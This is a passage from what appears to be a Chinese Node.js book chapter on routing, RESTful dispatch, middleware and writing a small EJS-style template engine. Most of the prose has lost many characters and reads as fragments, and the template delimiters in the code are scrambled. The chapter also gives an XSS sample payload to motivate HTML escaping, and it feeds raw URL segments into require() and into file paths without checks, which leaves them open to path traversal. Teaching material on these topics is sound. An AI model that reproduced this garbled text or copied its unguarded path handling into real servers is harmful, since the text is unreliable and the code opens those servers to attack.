在MVC起之前，动脚本也是本的由，它的是Web服务URL到对应的，/index.asp/index.php。Web服务后脚本的解，并入HTTP请的上下。
以下是Apache中PHP的
AddType application/x-httpd-php .php 
解脚本，并应，到服务的目的。今大多数的服务都能很能
后时服务动。这在Node中不，要因是的后都是.js，分不是后端脚本，还是前端脚本，这可不是好的。且Node中Web服务与应用务脚本是一的，这实。
8.3.2MVC 
在MVC之前，的都是过的，甚至以为是。到有一天开发者发用请的URL可以脚本在的没有关系。
MVC的要想是务分，要分为以下几。
（Controller），一组为的。
（Model），数相关的作。
图（View），图的。这是目前最为经的分（图8-3），大言，它的工作下。
由解，URL到对应的为。
为用相关的，数作。
数作后，用图相关数页，到客端。

用页，实都大小，我们在后续中开，且过。URL做由，这有个分实。一是过工关，一是自关。前者会有一个对应的由URL到对应的，后者没有这样的。

图8-3分
1. 
工了要工由外为始外，它对URL的要分灵活，几没有上的。下的URL都能自由
/user/setting /setting/user 
这已经有了一个用信的，下
exports.setting = function (req, res) { // TODO }; 
加一个的就，为了后续的，这个use()，下
var routes = []; 
var use = function (path, action) { routes.push([path, action]); }; 
我们在入程序中URL，后对应的，于是就了本的由过程，下
function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) { 
 var route = routes[i]; 
 if (pathname === route[0]) { var action = route[1]; action(req, res); return; 
} } // 处理404请求handle404(req, res); 
} 
工分，由于它对URL分灵活，以我们可以个都到相的务，下
use('/user/setting', exports.setting); use('/setting/user', exports.setting); // 
use('/setting/user/jacksontian', exports.setting); 
. 
对于的，用上的可，是下的请就了
/profile/jacksontian /profile/hoover
这些请要不的用不的内，这只有个用，系统中在上个用，我们就不可能工有用的由请，因应生，我们-过以下的就可以到用
use('/profile/:username', function (req, res) { // TODO }); 
于是我们我们的，在过use由时要为一个，后过它，下
var pathRegexp = function(path) { 
path = path  .concat(strict ? '' : '/?')  .replace(/\/\(/g, '(?:/') .replace(/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g, function(_, slash, format, key, capture, 
optional, star){ slash = slash || ''; return '' 
+ (optional ? '' : slash) 
+ '(?:' 
+ (optional ? slash : '') 
+ (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')' 
+ (optional || '') 

+ (star ? '(/*)?' : '');  })  .replace(/([\/.])/g, '\\$1')  .replace(/\*/g, '(.*)'); 
return new RegExp('^' + path + '$'); } 
上分复杂，言，它能实下的
/profile/:username => /profile/jacksontian, /profile/hoover /user.:ext => /user.xml, /user.json 
在我们新部分
var use = function (path, action) { routes.push([pathRegexp(path), action]); }; 
以部分
function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) { 
route = routes[i];  // var 正则配 if (route[0].exec(pathname)) { var action = route[1]; action(req, res); return; } } // 处理404请求handle404(req, res); } 
在我们的由能就能实了，为大量的用工由了。
数
管了，可以实相URL的，是:username到了，还没有解决。为我们还要一到的内，在务中能下这样用
use('/profile/:username', function (req, res) { var username = req.params.username; // TODO 
}); 
这的目是的内到req.params。一就是，下
var pathRegexp = function(path) { var keys = []; 
path = path  .concat(strict ? '' : '/?')  .replace(/\/\(/g, '(?:/') .replace(/(\/)?(\.)?:(\w+)(?:(\(.*?\)))?(\?)?(\*)?/g, function(_, slash, format, key, capture, 
 optional, star){ //将配的存keys.push(key); slash = slash || ''; return '' 
+ (optional ? '' : slash) 
+ '(?:' 
+ (optional ? slash : '') 
+ (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')' 
+ (optional || '') 

+ (star ? '(/*)?' : '');  })  .replace(/([\/.])/g, '\\$1')  .replace(/\*/g, '(.*)'); 
return {  keys: keys, regexp: new RegExp('^' + path + '$') 
}; } 
我们的实的URL到到的实，并到req.params，
下
function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) { 
route = routes[i];  // var 正则配 var reg = route[0].regexp; var keys = route[0].keys; var matched = reg.exec(pathname);  if (matched) { //具体var params = {}; for (var i = 0, l = keys.length; i < l; i++) { var value = matched[i + 1]; if (value) {  params[keys[i]] = value; } } req.params = params; 
var action = route[1]; action(req, res); return; 
} } // 处理404请求handle404(req, res); 
} 
至，我们了从（req.query）数（req.body）中到外，还能从的到。
2. 
工的优在于可以很灵活，是目大，由的数量也会很多。从前端到的，要阅才能定到实的，为有人，是由不由。实上并没有由，是由一定的自实了由，由。
上的解部分对这自的实有，言，它下了分
/controller/action/param1/param2/param3 
以/user/setting/12/1987为，它会定controllers目下的user，require后，用这个的setting()，余的作为数接这个。
function (req, res) { var pathname = url.parse(req.url).pathname; var paths = pathname.split('/'); var controller = paths[1] || 'index'; var action = paths[2] || 'index'; var args = paths.slice(3); var module; 
try {  // require的缓存机制使有是阻塞的 module = require('./controllers/' + controller); 
} catch (ex) {  handle500(req, res);  return; 
} var method = module[action] if (method) {
 method.apply(null, [req, res].concat(args)); } else {  handle500(req, res); } } 
由于这自的没有数的，以用req.params的，是
接过数，下
exports.setting = function (req, res, month, year) { // 如路径为/user/setting/12/1987么month为12year为1987 // TODO 
}; 事实上工也能作为数，不是过req.params。是这个，这不做。
自这由在PHP的MVCCodeIgniter中应用分广，分，在Node中实它也分。与工相，URL动，它的也要发生动，工只要动由可。
8.3.3RESTful 
MVC大了很多年，到RESTful的，大才识到URL也可以很，请也能作为分发的。
REST的是RepresentationalState Transfer，中为。REST的，我们为RESTful。它的学要服务端的内实作一个源，并在URL上。
一个用的下
/users/jacksontian 
这个了一个源，对这个源的作，要在HTTP请上，不是在URL上。过我们对用的是下这样URL的
POST /user/add?username=jacksontian GET /user/remove?username=jacksontian POST /user/update?username=jacksontian GET /user/get?username=jacksontian 
作为要在为上，要使用的请是POSTGET。在RESTful中，它是下这样的
POST /user/jacksontian DELETE /user/jacksontian PUT /user/jacksontian GET /user/jacksontian 
它DELETEPUT请入中，与源的作源的。对于这个源的，也不过一样在URL的后上。过源的与后有很大的关，
GET /user/jacksontian.json GET /user/jacksontian.xml 
在RESTful中，源的由请中的Accept服务端的情决定。客端时接JSONXML的应，它的Accept是下这样的
Accept: application/json,application/xml 
的服务端应要这个，后自己能应的做应。在应中，过Content-Type客端是，下
Content-Type: application/json
，我们之为的。以REST的就是，过URL源、请定源的作，过Accept决定源的。RESTful与MVC并不，且是好的。相MVC，RESTful只是HTTP请也加入了由的过程，以在URL上源。
. 
为了Node能RESTful，我们了我们的。use是对有请的，在RESTful的场景下，我们要区分请。下
var routes = {'all': []}; var app = {}; app.use = function (path, action) { 
routes.all.push([pathRegexp(path), action]); }; 
['get', 'put', 'delete', 'post'].forEach(function (method) { routes[method] = []; app[method] = function (path, action) { 
 routes[method].push([pathRegexp(path), action]); }; }); 
上的加了get()、put()、delete()、post()4个后，我们过下的由
//加用户app.post('/user/:username', addUser); //用户app.delete('/user/:username', removeUser); //用户
app.put('/user/:username', updateUser); //查询用户app.get('/user/:username', getUser); 
这样的由能识请，并务分发。为了分发部分，我们的部分为match()，下
var match = function (pathname, routes) { for (var i = 0; i < routes.length; i++) { route = routes[i]; 
 // var 正则配 var reg = route[0].regexp; var keys = route[0].keys; var matched = reg.exec(pathname);  if (matched) { 
//具体var params = {}; for (var i = 0, l = keys.length; i < l; i++) { 
var value = matched[i + 1]; if (value) {  params[keys[i]] = value; 
} } req.params = params; 
var action = route[1]; action(req, res); return true; 
} } return false; 
}; 
后我们的分发部分，下
function (req, res) { var pathname = url.parse(req.url).pathname; // 将请求方法为小写var method = req.method.toLowerCase(); if (routes.hasOwnPerperty(method)) { 
 //据请求方法分发 if (match(pathname, routes[method])) { return; 
 } else { //如路径有配成功试all()处理if (match(pathname, routes.all)) { 
return; } } 
} else {  //接all()处理 if (match(pathname, routes.all)) { 
return; } 
} 
// 处理404请求
handle404(req, res); 
} 
，我们了实RESTful的要。这的实过程用了工的，事实上过自也能RESTful的，是Controller/Action的定要为Resource/Method的定，已经实，不。
目前RESTful应用已经开始广起，着务前端、客端的多样，RESTful以量的，到广大开发者的。对于多数的应用言，只要一RESTful服务接，就能应动端、PC端的客端应用。
8.4
接触Web应用的能由能后，我们发从应Hello World的到实的目，实有多的工作要，上内只是了要的部分。对于Web应用言，我们不用接触到这多性的，为我们入中（middleware）这些与务之的，开发者能关在务的开发上，以到开发的目的。
在最的中的定中，它是一在作系统上为应用服务的机。它不是作系统的一部分，也不是应用的一部分，它于作系统与应用之，应用好、使用服务。今中的了这，为上服务的，并定在作系统。这要到的中，就是为我们上的有HTTP请的中，开发者可以这部分，在务上。
中的为Java中过（filter）的工作，就是在入的务之前，过。它的工作图8-4。
图8-4，从HTTP请到务之，实有很多的要。Node的http了应用网的，对务并没有，在务之下，有开发对务。这我们过中的开发，这个开发用组织个中。对于Web应用的能，我们过中，个中相对的，最强大的。
由于中就是前的些本能，以它的上下也就是请对应对reqres。有一区的是，由于Node的因，我们要一机，在前中后，下一个中。在4中实已经对中做了，这我们还是用Connect的，过触发的实。一个本的中会是下的
var middleware = function (req, res, next) { 
// TODO 
next(); 
} 

图8-4中的工作
的，我们为的务加中应是很的事情，过，能有的能起，下
app.use('/user/:username', querystring, cookie, session, function (req, res) { // TODO }); 
这的querystring、cookie、session中与前的能大小下
// querystring解析中间件
var querystring = function (req, res, next) { req.query = url.parse(req.url, true).query; next(); 
}; // cookie解析中间件var cookie = function (req, res, next) { 
var cookie = req.headers.cookie; var cookies = {}; if (cookie) {
 var list = cookie.split(';'); 
 for (var i = 0; i < list.length; i++) { var pair = list[i].split('='); cookies[pair[0].trim()] = pair[1]; 
} } 
req.cookies = cookies; next(); }; 
可以到这的中都是分的，接下我们要组织起这些中。这我们由分开，中务都务，use()下
app.use = function (path) { 
var handle = {  //数作为路径 path: pathRegexp(path),  //其他的是处理单元 stack: Array.prototype.slice.call(arguments, 1) 
}; routes.all.push(handle); }; 
后的use()中都了stack数组中，后触发。由于发生，我们的部分也要，下
var match = function (pathname, routes) { 
for (var i = 0; i < routes.length; i++) {  var route = routes[i];  //正则配 var reg = route.path.regexp;  var matched = reg.exec(pathname);  if (matched) { 
//具体//代码//将中间件数组给handle()方法处理handle(req, res, route.stack); return true; 
} } return false; 
}; 
一，中动都了handle()，后，性数组中的中，个中后，定用入next()以触发下一个中（者接应），到最后的务。下
var handle = function (req, res, stack) { 
var next = function () {  //从stack数组中出中间件执行 var middleware = stack.shift();  if (middleware) { 
//传入next()函数自使中间件能执行结递middleware(req, res, next); } }; 
// 启动执行next(); }; 
这的问是，像querystring、cookie、session这样的能中是否要为个由都都会下的由
app.get('/user/:username', querystring, cookie, session, getUser); app.put('/user/:username', querystring, cookie, session, updateUser); //多路
为个由都中并不是一个好的，中务是的，我们是否可以由中是否可以人性能的，能的是Yes，下
app.use(querystring); app.use(cookie); app.use(session); app.get('/user/:username', getUser); app.put('/user/:username', authorize, updateUser); 
为了灵活的，这续我们的use()以应数的，下
app.use = function (path) { 
var handle; 
if (typeof path === 'string') { 
 handle = { 
//数作为路径
path: pathRegexp(path), 
//其他的是处理单元
stack: Array.prototype.slice.call(arguments, 1) 
 }; 
} else { 
 handle = { 
//数作为路径
path: pathRegexp('/'), 
//其他的是处理单元
stack: Array.prototype.slice.call(arguments, 0) 
 }; 
} 
routes.all.push(handle); 
}; 
了use()外，还要续我们的过程，与前一一次后就不后续不，还会继续后续，这我们有到中的都时起，下
var match = function (pathname, routes) { 
var stacks = []; 
for (var i = 0; i < routes.length; i++) { 
route = routes[i]; 
 // var 正则配
 var reg = route.path.regexp; 
 var matched = reg.exec(pathname); 
 if (matched) { 
//具体
//代码
//将中间件存
stacks = stacks.concat(route.stack); 
} 
} 
return stacks; 
}; 
use()后，还要续分发的过程
function (req, res) { var pathname = url.parse(req.url).pathname; // 将请求方法为小写var method = req.method.toLowerCase(); // all()方法的中间件var stacks = match(pathname, routes.all); if (routes.hasOwnPerperty(method)) { 
 //据请求方法分发关的中间件 stacks.concat(match(pathname, routes[method])); } 
if (stacks.length) {  handle(req, res, stacks); 
} else {  //处理404请求 handle404(req, res); 
} } 
上，过中由的作，我们不不之已经复杂的事情下，Web应用开发者可以只关务开发就能个开发工作。
8.4.1
是，个中办我们要为自己的Web应用的定性性。于是我们为next()加err数，并中接的，下
var handle = function (req, res, stack) { var next = function (err) { if (err) { 
return handle500(err, req, res, stack); }  //从stack数组中出中间件执行 var middleware = stack.shift();  if (middleware) { 
//传入next()函数自使中间件能执行结递try { middleware(req, res, next); } catch (ex) { next(err); } } }; 
// 启动执行next(); }; 
由于的不能接（在4中有过），中产生的要自己，下
var session = function (req, res, next) { 
var id = req.cookies.sessionid; store.get(id, function (err, session) { 
 if (err) { //将异常通过next()传递return next(err); 
}  req.session = session;  next(); 
}); }; 
Next()接到对后，会handle500()。为了中的想续下，我们认为的中也是能数组的。由于要时，以用于
的中的与中有，它的数有4个，下
var middleware = function (err, req, res, next) { // TODO next(); 
}; 
我们过use()可以有的中起，下
app.use(function (err, req, res, next) { // TODO }); 
为了区分中中，handle500()会对中数，后。
var handle500 = function (err, req, res, stack) { // 异常处理中间件stack = stack.filter(function (middleware) { 
 return middleware.length === 4; }); 
var next = function () {  //从stack数组中出中间件执行 var middleware = stack.shift(); 8  if (middleware) { 
//传递异常对象middleware(err, req, res, next); } }; 
// 启动执行next(); }; 
8.4.2
前我们加了强大的中组织能，到一个的，就是我们的务是在最后才。为了务，应端用，中的编写使用是
要一的。下是个要的能的。编写高的中。
用由，不要的中。
1. 

编写高的中实就是个的，以用next()后续。要的事情是，一中，个请都会使中一次，它只1的时，都会我们的QPS下。的优有几。
使用高的。要时过jsperf.com测试性能。
要复的（要用量，因在5过）。
不要的。HTTP的解，对于GET不要。
2. 

在有一高的中后，并不着个中我们都使用，的由使不要的中不与请的过程。这以一个问题。我们这有一个的中，它会对请，上在对应，就应对应的，否就由下中，下
var staticFile = function (req, res, next) { var pathname = url.parse(req.url).pathname; 
fs.readFile(path.join(ROOT, pathname), function (err, file) {  if (err) { 
return next(); }  res.writeHead(200);  res.end(file); 
}); }; 
我们以下的由
app.use(staticFile); 
着对/下的有URL请都会。由于它中到了I/O，，它的还，是不，次的I/O都是对性能的，使QPS线下。对于这情，我们要做的是，就不能使用认的/了，因为它的高。它加一个好的由是个不的，下
app.use('/public', staticFile); 
这样只有/public会上，余本不会中。
8.4.3
中使前的能，从的发收很的组织。对于个中言，它，一。与像一样杂在一起的相，它好的可测试性。中机使Web应用好的可性可组性，可以数。从它就是Unix学的一个实，，小，后过组使用，发强大的能量。
中是Connect的经，过本的，我们已经可以到个Connect是的。本试图解Web开发过程的前，了多，管与实的Connect不相，着这些，开发者都能立写应自己务的。
8.5
过中机组织能我们的请后，不管是过MVC还是过RESTful由，开发者者是用了数，者是了作，者是了内，这时我们于到了应客端的部分了。这的页是个的题，我们实应的可能是一个HTML网页，也可能是CSS、JS，者是他多。这我们要接上的HTTP应实的技术，要包内应页个部分。
对于过的ASP、PHP、JSP动网页技术，页是一内的能。对于Node，它并没有这样的内能，在本的中，你会到是因为能的，我们可以，发多好的技术，社区的创使Node在HTTP应上加多的。
8.5.1
在7我们了http了对请应的作，在这我们开应用使用应的。服务端应的，最都要端。这个端可能是端，也可能是端，也可能是。服务端的应从一定程上决定了客端应的内。
内应的过程中，应中的Content-*分要。在下的应中，服务端客端内是以gzip编的，内为21 170个，内为JavaScript，为UTF-8
Content-Encoding: gzip Content-Length: 21170 Content-Type: text/javascript; charset=utf-8
客端在接收到这个后，的过程是过gzip解中的内，用内是否，后以UTF-8解后的脚本入到中。
1. MIME 
想要客端用的应内，了解MIME不可。可以想一下下在客端会有样的
res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('<html><body>Hello World</body></html>\n'); //者
res.writeHead(200, {'Content-Type': 'text/html'}); 
res.end('<html><body>Hello World</body></html>\n'); 
在网页中，前者的是<html><body>Hello World</body></html>，后者只能到Hello World，图8-5。

图8-5 Content-Type不使网页的内不
没，起上的因就在于它们的Content-Type的是不的。对内用了不的，前者为本，后者为HTML，并了DOM树。是过不的Content-Type的决定用不的，这个我们为MIME。
MIME的是Multipurpose Internet Mail Extensions，从可以，它最用于，后也应用到中。不的有不的MIME，JSON的为application/json、XML的为application/xml、PDF的为application/pdf。
为了的MIME，社区有有的mime可以用。它的用分，下
var mime = require('mime'); 
mime.lookup('/path/to/file.txt'); // => 'text/plain' mime.lookup('file.txt'); // => 'text/plain' mime.lookup('.TXT'); // => 'text/plain' mime.lookup('htm'); // => 'text/html'
了MIME外，Content-Type的中还可以包一些数，。下
Content-Type: text/javascript; charset=utf-8 
2. 
在一些场景下，应的内是样的MIME，中并不要客端开它，只并下它可。为了这，Content-Disposition应场。Content-Disposition的为是客端会它的是应数做时的内，还是可下的。内只时时，它的为inline，数可以为时，它的为attachment。外，Content-Disposition还能过数定时应使用的。下
Content-Disposition: attachment; filename="filename.ext" 
我们要一个应下的API（res.sendfile），我们的大是下这样的
res.sendfile = function (filepath) { fs.stat(filepath, function(err, stat) {  var stream = fs.createReadStream(filepath); 
 //设置内容 res.setHeader('Content-Type', mime.lookup(filepath));  //设置长 res.setHeader('Content-Length', stat.size);  //设置为附件 res.setHeader('Content-Disposition' 'attachment; filename="' + path.basename(filepath) + '"');  res.writeHead(200);  stream.pipe(res); 
}); }; 
3. JSON
为了应JSON数，我们也可以下这样
res.json = function (json) { res.setHeader('Content-Type', 'application/json'); res.writeHead(200); res.end(JSON.stringify(json)); 
}; 
4. 
我们的URL因为些问题（）不能前请，要用到的URL时，我们也可以一个的实，下
res.redirect = function (url) { res.setHeader('Location', url); res.writeHead(302); res.end('Redirect to ' + url); 
}; 
8.5.2
Web应用的内应分，可以是内，也可以是他，也可以是。这我们到的的HTML内的应上，图。Web应用最在上的内，都是过一系的图的。在动页技术中，最的图是由数生的。
是有的HTML，过与数的，数到这些中，最后生的数的HTML。我们为render()，数就是数，下
res.render = function (view, data) { res.setHeader('Content-Type', 'text/html'); res.writeHead(200); // 实渲染var html = render(view, data); res.end(html); 
}; 
在Node中，数自是以JSON为，是有多可以使用了。上中的render()我们可以是一个定接，接相数，最后HTML。这样的我们都作实了这个接。
8.5.3
最的服务端动页开发，是在CGI程序servlet中HTML，过网到客端，客端到用上。这与HTML的杂在一起的开发，一个小小的UI动都要大动，甚至要新编。为了这情，使HTML与分开，生一些服务端动网页技术，ASP、PHP、JSP。它们动语言部分过的（ASPJSP以<%%>作为，PHP以<? ?>作为）包起，过HTML，开发者从HTML的工作中解。这样的一定程上了开发的，是页还是着大量的。这生了MVC在动网页技术中的发，MVC、、数分开的，大大高了目的可性。中技术就在这样的发中熟起的。
管技术起在MVC时才广使用，不可否认的是ASP、PHP、JSP，它们实就是最的技术。技术多多样，它的实质就是数过生最的HTML。技术的也就下4个要。
语言。
包语言的。有动数的数对。。对于ASP、PHP、JSP言，于服务端动页的内能，语言就是它们的
语言（VBScript、JScript、PHP、Java），就是以.php、.asp、.jsp为后的，就是Web。
这个时的极上下，甚至要个HTTP的请对。后语言的发使可以上下环境，只有数对就可以。PHP中的PHPLIB Template FastTemplate、Java的XSTL，以Velocity、JDynamiTe、Tapestry。
这的在于它的实与语言有很大的关性，由于语言用的语言不，包，性。的一定编程语言就不会环境，以有开发者开发新的语言应不的编程语言。今系统多，能应用到多门编程语言中的这也开始。
者是Mustache，它自己是的（logic-less templates），定了以{{}}为的一语言，并了多门编程语言的实，使用它作为很好的可性。着Node在社区的发，很开，语言可以创，也可以实。Node社区目前与相关的不多要3个才能。并且由于Node与前端都用相的语言JavaScript，以一语言也为它编写不的就能前后端用。
数与最相，这有一个、动的分过程，相的不的数可以到不的，不的与相的数也能到不的。技术使网页中的动内内不相，数开发者与开发者只要定好数，者就不用相了，图8-6。

图8-6技术
技术并不是的技术，它的实上是接这样很的活，只是有着自的优技。是接并不为过，我们要的就是加数，过的就能到最的HTML这样。
我们的是下这样的，<=>
%%就是我们定的（这个要因为ASP JSP都用它做，相对熟悉）
Hello < =% username >
%
我们的数是{username: "JacksonTian"}，我们的就是Hello JacksonTian。实的过程是分为Hello<%= username %>个部分，前者为，后者是。要继续，与数关后为一个量，最与量最的。图8-7了与数的过程图。

图8-7与数的过程图
1. 
为了的技术，我们过render()实一个的。这个
会Hello <%= username %>为"Hello " + obj.username。过程以下几个。
语分解。，这个过程用，<=>
%%的为/< =([\s\S]+?) >/g。
%%
。的语言。生的语。与数一起，生最。了程，数就可以开工了，下
var render = function (str, data) { // 模板是换的var tpl = %%
str.replace(/< =([\s\S]+?) >/g, function(match, code) {  return "' + obj." + code + "+ '"; }); 
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; var complied = new Function('obj', tpl); return complied(data); 
}; 
用上的数试试，下
var tpl = 'Hello < =username >.';%
% 
console.log(render(tpl, {username: 'Jackson Tian'})); // => Hello Jackson Tian. 
. 
上的实过程中，可以到有部分内前没有，它的内下
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; var complied = new Function('obj', tpl); 
为了能最与数一起生，我们要始的一个数对。Hello < %=username >
%这，最会生下的
function (obj) { var tpl = 'Hello ' + obj.username + '.'; return tpl; 
} 
这个过程为编，生的中数只与相关，与的数关。
次都生这个中数，就会CPU。为了的性能，我们会用
编的。是，上的可以解为个，下
var complie = function (str) { var tpl = %%
str.replace(/< =([\s\S]+?) >/g, functi on(match, code) { return "' + obj." + code + "+ '"; }); 
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; return new Function('obj, escape', tpl); 
}; 
var render = function (complied, data) { return complied(data); }; 
过编编后的，实应用中就可以实一次编，多次，始的次过程中都要一次编。
2. with上实的，只能量，< ="Jackson Tian" %>就了。为了它
% 
灵活，我们要它的实，使能继续为，量能自动于它的对。于是with关入到我们的实中。with关是JavaScript中Douglas Crockford的，在本书C中有。在这，with关可以到很的应用。
var complie = function (str, data) { // 模板是换的var tpl = %%
str.replace(/< =([\s\S]+?) >/g, function (match, code) {  return "' + " + code + "+ '"; }); 
tpl = "tpl = '" + tpl + "'"; tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;'; return new Function('obj', tpl); 
}; 
就接，量code的是obj[code]。关于new Function()，这过它创了一个数对，它的语下
new Function ([arg1[, arg2[, ... argN]],] functionBody) 
Function()数接多个数，最后一个数作为数的内，余数都会用作为新生的数的数。
. 
前到过XSS，它的产生大多相关，上中的username的为<script>alert("I am XSS.")</script>，的会是
Hello <script>alert("I am XSS.")</script>. 
这会在页上这个脚本，好这的username是在URL的上入的，这就了XSS。为了高性，大多数都了的能。就是能HTML
的的，这些要有&、<、>、"、'。数下
var escape = function (html) { 
return String(html)  .replace(/&(?!\w+;)/g, '&amp;')  .replace(/</g, '&lt;')  .replace(/>/g, '&gt;')  .replace(/"/g, '&quot;')  .replace(/'/g, '&#039;'); // IE不支持&apos;单引转义
}; 
不定要HTML的最好都，为了，<=>
%%
<%->
%分为的情，下
var render = function (str, data) { 
var tpl = str.replace(/\n/g, '\\n') // 将换行符换
.replace(/< =([% \s\S]+?) >/g, function (match, code) { 
%
 //转义 return "' + escape(" + code + ") + '"; }).replace(/<%-([\s\S]+?) >/g, function (match, code) {
%
 //正常输出
 return "' + " + code + "+ '"; 
}); 
tpl = "tpl = '" + tpl + "'"; 
tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;'; 
// 加上escape()函数
return new Function('obj', 'escape', tpl); 
}; 
过分-=并区对，最后不要入escape()数。最上的会为的，下
Hello &lt;script&gt;alert(&quot;I am XSS.&quot;)&lt;/script&gt;. 
因，在技术的使用中，时不要，是与入有关的量一定要。
3. 模
管技术已经务与图部分分开，是图上还是会在一些页的最。为了上强大一，我们为它加，使可以像ASP、PHP样页。下的，HTML与入数相关
<% if (user) { >
% <h2>< = user.name %></h2> 
% <% } else { > 
% 
<h2>名用户</h2> <% }>

%
它要编的数应是下这样的
function (obj, escape) { 
var tpl = ""; 
with (obj) {
 if (user) { 
tpl += "<h2>" + escape(user.name) + "</h2>"; 
 } else { 
tpl += "<h2>名用户</h2>"; 
} 
} 
return tpl; 
} 
接的还是过，下
var complie = function (str) { 
var tpl = str.replace(/\n/g, '\\n') // 将换行符换
.replace(/< =([% \s\S]+?) >/g, function (match, code) { 
%
 //转义
 return "' + escape(" + code + ") + '"; }).replace(/< =([% \s\S]+?) >/g, function (match, code) {
%
 //正常输出 return "' + " + code + "+ '"; }).replace(/< ([% \s\S]+?) >/g, function (match, code) { 
%
 //执行代码
 return "';\n" + code + "\ntpl += '"; }).replace(/\'\n/g, '\'') .replace(/\n\'/gm, '\''); 
tpl = "tpl = '" + tpl + "';"; // 转换空行tpl = tpl.replace(/''/g, '\'\\n\''); tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;'; return new Function('obj', 'escape', tpl); 
}; 
上的实后，试试，下
var tpl = [ '< % if (user) { %>',  '<h2>< =user.name ></h2>',
%% '< % } else { %>',  '<h2>名用户</h2>', '< % } %>'].join(' \n'); 
render(complie(tpl), {user: {name: 'Jackson Tian'}}); 
到的内下
<h2>Jackson Tian</h2> 
接下在不user时试试，下
render(complie(tpl), {}); 
是到信，下
undefined:5  if (user) { ^ ReferenceError: user is not defined 
为了程序的性，要写一，对于不定是否在的性，应为它加上用，下
var tpl = [ '<% if (obj.user) { >',
%
 '<h2>< =user.name ></h2>',
%% '< % } else { %>',  '<h2>名用户</h2>', '< % } %>'].join(' \n'); 
EJS中，它的量不是obj，是locals，这的与中的with语有关。新上的，到的为
<h2>名用户</h2> 
外，实了的还能环，下
var tpl = [ '< % for (var i = 0; i < items.length; i++) { %>',  '< var % item = items[i]; >', 
% '<p>< = % i+1 %><=item.name></p>',
%% 
'< % } %>' ].join('\n'); render(complie(tpl), {items: [{name: 'Jackson'}, {name: ''}]}); 
到的下
<p>1Jackson</p> <p>2</p>
，我们实的已经能了，图的不问题。
4. 
前我们实的complie()render()数已经能实入的编的能。与前的HTTP应对组起的，我们应一个客端的请大下
app.get('/path', function (req, res) { fs.readFile('file/path', 'utf8', function (err, text) { 
 if (err) { res.writeHead(500, {'Content-Type': 'text/html'}); res.end('模板文件错误'); return; 
}  res.writeHead(200, {'Content-Type': 'text/html'});  var html = render(complie(text), data);  res.end(html); 
}); }); 
这样的应并不友好，有下几。次请要反复读上的。次请要编。用。你性不的，应大多数的MVC在做时都只有一个的render()
，以我们也要一个、性能好的render()数，下
var cache = {}; var VIEW_FOLDER = '/path/to/wwwroot/views'; 
res.render = function (viewname, data) { 
if (!cache[viewname]) {  var text;  try { 
text = fs.readFileSync(path.join(VIEW_FOLDER, viewname), 'utf8');  } catch (e) { 
res.writeHead(500, {'Content-Type': 'text/html'}); res.end('模板文件错误'); return; 
} 
 cache[viewname] = complie(text); } var complied = cache[viewname]; res.writeHead(200, {'Content-Type': 'text/html'}); var html = complied(data); res.end(html); 
}; 
这个res.render()实中，有读的情，是由于用了，只会在一次读的时候个程的，一生，不会反复读。次，之前已经了编，也不会次读都编。
数之后，我们的用就很了，下
app.get('/path', function (req, res) { res.render('viewname', {}); }); 
与系统之后，入，可以很好解决性能问题，接也大大到。由于内都不大，也不于动动的，以使用程的内编，并不会起大的收问题。
5. 
有时候大，过复杂，会加上的，且有些是可以用的，这生了（Partial View）的产生。可以在的中，多个可以入一个中。多个复杂的大的本要很多，很多复杂问题可以解为多个小的问题。
这我们用include关实的。下
<ul> <% users.forEach(function(user){ %> <%  include user/show %> <% }) %> </ul> 
user/show内下
<li>< =user.name ></li>
%%
的应以下的
<ul> <% users.forEach(function(user){ %>  <li>< =user.name %></li> 
% <% }) %> </ul> 
以实的就是include语，性编，下
var files = {}; 
var preComplie = function (str) { var replaced = %
str.replace(/<%\s+(include.*)\s+ >/g, function (match, code) {  var partial = code.split(/\s/)[1];  if (!files[partial]) { 
files[partial] = fs.readFileSync(fs.join(VIEW_FOLDER, partial), 'utf8'); }  return files[partial]; 
}); 
// 多套续换if (str.match(/<%\s+(include.*)\s+ >/)) {
%
 return preComplie(replaced); } else {  return replaced; } }; 
后我们一下complie()数，在编前，下
var complie = function (str) { // 解析子模板str = preComplie(str); var tpl = str.replace(/\n/g, '\\n') // 将换行符换.replace(/< =([% \s\S]+?) >/g, function (match, code) { 
%
 //转义 return "' + escape(" + code + ") + '"; }).replace(/< =([\s\S]+?) >/g, function (match, code) {
%% 
 //正常输出 return "' + " + code + "+ '"; }).replace(/< ([% \s\S]+?) >/g, function (match, code) { 
%
 //执行代码
 return "';\n" + code + "\ntpl += '"; }).replace(/\'\n/g, '\'') .replace(/\n\'/gm, '\''); 
tpl = "tpl = '" + tpl + "';"; // 转换空行tpl = tpl.replace(/''/g, '\'\\n\''); tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;'; return new Function('obj', 'escape', tpl); 
}; 
6. 
要是为了用的复杂。的一使用就是图
（layout），图页，它与的相，是场景有区。一言定了，它的就了，入到多个中于，是在多个中只是入的图不，内一样，也会复。下个的
//模板1 <ul> 
<% users.forEach(function(user){ %> <%  include user/show %> 
<% }) %> </ul> //模板2 <ul> 
<% users.forEach(function(user){ %> <%  include profile %> <% }) %> </ul> 
这些复的内要用，为了能这些用起，技术图。图之后，就只有一，图时，定好图就可以了，下
res.render('viewname', { layout: 'layout.html', users: [] 
}); 
对于，我们为<%- body %>部分为我们的，下
<ul> <% users.forEach(function(user){ %> <%-body %> <% }) %> </ul> 
下
var renderLayout = function (str, viewname) { return str.replace(/<%-\s*body\s* >/g, function (match, code) { 
%
 if (!cache[viewname]) { 
cache[viewname] = fs.readFileSync(fs.join(VIEW_FOLDER, viewname), 'utf8'); }  return cache[viewname]; 
}); }; 
最res.render()数，下
res.render = function (viewname, data) { var layout = data.layout; if (layout) {
